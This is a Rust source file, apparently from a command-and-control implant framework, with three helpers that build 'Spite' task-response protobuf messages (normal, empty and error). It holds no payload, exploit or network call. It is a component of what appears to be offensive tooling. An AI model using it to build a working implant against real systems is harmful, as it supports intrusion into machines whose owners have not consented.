use malefic_helper::protobuf::implantpb::{self};
use malefic_helper::protobuf::implantpb::spite::Body;


pub fn new_spite(task_id: u32, name: String, body: implantpb::spite::Body) -> implantpb::Spite {
    implantpb::Spite {
        task_id,
        r#async:true,
        timeout:0,
        name,
        error: 0,
        status: Option::from(implantpb::Status {
            task_id,
            status: 0,
            error: "".to_string(),
            msg: None
        }),
        body: Some(body),
    }
}

pub fn new_empty_spite(task_id: u32, name: String) -> implantpb::Spite {
    implantpb::Spite {
        task_id,
        r#async:true,
        timeout:0,
        name,
        error: 0,
        status: Option::from(implantpb::Status {
            task_id,
            status: 0,
            error: "".to_string(),
            msg: None
        }),
        body: Some(Body::Empty(implantpb::Empty::default())),
    }
}
pub fn new_error_spite(task_id: u32, name: String, error: u32) -> implantpb::Spite {
    implantpb::Spite {
        task_id,
        r#async: true,
        timeout:0,
        name,
        error,
        status: Option::from(implantpb::Status {
            task_id,
            status: 1,
            error: "".to_string(),
            msg: None
        }),
        body: None,
    }
}
